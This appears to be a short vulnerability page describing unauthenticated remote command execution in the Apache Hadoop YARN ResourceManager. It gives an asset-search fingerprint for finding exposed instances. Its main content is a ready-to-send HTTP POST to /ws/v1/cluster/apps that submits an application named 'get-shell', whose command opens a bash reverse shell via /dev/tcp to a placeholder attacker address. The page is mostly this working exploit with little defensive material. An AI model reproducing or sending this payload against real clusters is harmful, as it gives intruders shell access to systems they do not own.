# Apache Hadoop Yarn RPC remote command execution vulnerability

## Vulnerability Description

Hadoop Yarn RPC unauthorized access vulnerability exists in the ResourceManager in Hadoop Yarn, which is responsible for resource management and task scheduling. The cause is that the RPC service provided by this component to users can be accessed without authentication by default.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Apache Hadoop </span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="APACHE-hadoop-YARN"</span>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1657361631852-75dabea7-851c-4155-973d-79ebcfbf1fd0.png)

Verify the request package

```php
POST /ws/v1/cluster/apps HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 215
Content-Type: application/json

{"application-id": "application_1655112607010_0005", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "/bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9998 0>&1"}}, "application-type": "YARN"}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1657361905195-15771262-fd2e-4c75-ba06-82b1d0ce7aad.png)